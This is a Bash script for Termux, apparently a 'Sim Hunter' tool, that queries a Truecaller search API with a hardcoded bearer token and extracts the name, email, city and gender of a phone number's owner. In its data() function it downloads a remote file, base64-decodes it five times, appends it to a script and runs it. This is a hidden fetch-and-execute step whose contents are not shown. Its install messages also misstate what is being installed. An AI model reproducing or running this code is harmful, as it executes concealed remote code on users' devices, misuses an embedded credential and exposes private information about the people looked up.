trap 'printf "\n";stop' 2
load() {
sleep 6 & PID=$! #Loading... Animation
echo
echo
printf "\e[32m["
while kill -0 $PID 2> /dev/null; do
printf  "▓"
sleep 1
done
printf "]\n\e[0m\e[1m\n"
}
banner() {
bash .logo.sh
}
req() {
command -v python > /dev/null 2>&1 || { echo >&2 "...";clear;banner;echo "";echo "";echo "[^^] Python Installing...";load;pkg install python -y;clear; }
command -v jq > /dev/null 2>&1 || { echo >&2 "...";clear;banner;echo "";echo "";echo "[^^] Setup Database..";load;pkg install jq -y;clear; }
command -v python2 > /dev/null 2>&1 || { echo >&2 "...";clear;banner;echo "";echo "";echo "[^^] Downloading Config Files...";load;pkg install python2 -y;clear; }
command -v wget > /dev/null 2>&1 || { echo >&2 "...";clear;banner;echo "";echo "";echo "[^^] wget Installing...";load;pkg install wget -y;clear; }
command -v lolcat > /dev/null 2>&1 || { echo >&2 "...";clear;banner;echo "";echo "";echo "[^^] lolcat Installing...";load;pip install lolcat;clear; }
command -v figlet > /dev/null 2>&1 || { echo >&2 "...";clear;banner;echo "";echo "";echo "[^^] Figlet Font Installing...";load;pkg install figlet -y;clear; }
command -v toilet > /dev/null 2>&1 || { echo >&2 "...";clear;banner;echo "";echo "";echo "[^^] Toilet Font Installing...";load;pkg install toilet -y;clear; }
}
request() {
clear
bash .logo.sh
echo
printf "\033[0m\033[1mEnter Your Number : \033[33m\033[1m"
read varnumber
printf "\033[0m\033[1mEnter Country Code : \033[33m\033[1m"
printf "\033[0m"
read country
echo
curl -k -X GET "https://search5-noneu.truecaller.com/v2/search?q=$varnumber&countryCode=$country&type=10&placement=SEARCHRESULTS%2CHISTORY%2CDETAILS&adId=c532a019-1768-419a-8fea-c79531bfd535&encoding=json" -H "accept: application/json" -H "authorization: Bearer a1i0j--YbZkMnVE-5Gs-Caf_yFqAOSvptwyVFx6rhnjM81EDtzETMtFwC6JbpTBQ" >> data.json
}
data() {
cat data.json | jq -r '.data | .[] | .name' > name
cat data.json | jq -r '.data | .[] | .phones | .[] | .e164Format' > number
cat data.json | jq -r '.data | .[] | .phones | .[] | .dialingCode' > dcode
cat data.json | jq -r '.data | .[] | .phones | .[] | .countryCode' > ccode
cat data.json | jq -r '.data | .[] | .phones | .[] | .carrier' > sim
cat data.json | jq -r '.data | .[] | .addresses | .[] | .city' > city
cat data.json | jq -r '.data | .[] | .gender' > gender
cat data.json | jq -r '.data | .[] | .internetAddresses | .[] | .id' > email
echo "name='$(cat name)'" >> phoneinfo.sh
echo "number='$(cat number)'" >> phoneinfo.sh
echo "dcode='$(cat dcode)'" >> phoneinfo.sh
echo "ccode='$(cat ccode)'" >> phoneinfo.sh
echo "sim='$(cat sim)'" >> phoneinfo.sh
echo "city='$(cat city)'" >> phoneinfo.sh
echo "gender='$(cat gender)'" >> phoneinfo.sh
echo "email='$(cat email)'" >> phoneinfo.sh
echo "" >> phoneinfo.sh
wget https://raw.githubusercontent.com/Bhai4You/bhai4you/master/dists/Metasploit/extras/binary-data
cat binary-data | base64 -d | base64 -d | base64 -d | base64 -d | base64 -d > 3
cat 3 >> phoneinfo.sh
rm -f 3 binary-data
clear
bash .logo.sh
bash phoneinfo.sh
rm -f data.json
}
req3() {
if [[ -e "googleapi.txt" ]]; then
clear
else
clear
bash .logo.sh
echo
printf "\e[1;92m[\e[0m^^\e[1;92m] Downloading Secret API...\n"
load
wget https://raw.githubusercontent.com/Bhai4You/bhai4you/master/googleapi.txt
clear
fi
}
logo1(){
if [[ -e ".logo1.sh" ]]; then
clear
else
clear
echo
printf "\e[1;92m[\e[0m^^\e[1;92m] Downloading Banner...\n"
load
wget https://raw.githubusercontent.com/Bhai4You/bhai4you/master/.logo1.sh
clear
fi
}
logo2(){
clear
bash .logo1.sh
sleep 1.5
clear
bash .logo.sh
echo -e "\t\e[33m\e[1m[^^]\e[0m\e[1m Name  \t\e[91m\e[1m:  \e[92m\e[1mSim Hunter"
sleep 1
echo -e "\t\e[33m\e[1m[^^]\e[0m\e[1m Lang.  \t\e[91m\e[1m:  \e[92m\e[1mBash"
sleep 1
echo -e "\t\e[33m\e[1m[^^] \e[0m\e[1mAuthor  \t\e[91m\e[1m:  \e[92m\e[1mParixit Sutariya"
sleep 1
echo -e "\t\e[33m\e[1m[^^] \e[0m\e[1mYT  \t\e[91m\e[1m: \e[92m\e[1m yt.com/BullAnonymous"
sleep 1
echo -e "\t\e[33m\e[1m[^^] \e[0m\e[1mGithub  \t\e[91m\e[1m:  \e[92m\e[1mgithub.com/Bhai4You"
sleep 1
echo -e "\t\e[33m\e[1m[^^] \e[0m\e[1mBlog    \t\e[91m\e[1m:  \e[92m\e[1mbhai4you.blogspot.com"
sleep 1
echo -e "\t\e[33m\e[1m[^^] \e[0m\e[1mDate  \t\e[91m\e[1m:  \e[92m\e[1m29-3-22"
sleep 1
echo
}
logo(){
if [[ -e ".logo.sh" ]]; then
clear
else
clear
echo
printf "\e[1;92m[\e[0m^^\e[1;92m] Downloading Banner...\n"
load
wget https://raw.githubusercontent.com/Bhai4You/bhai4you/master/.logo.sh
clear
fi
}
about(){
if [[ -e ".a" ]]; then
clear
else
echo
logo2
touch .a
fi
}
clear
logo
logo1
req
req3
about
request
data
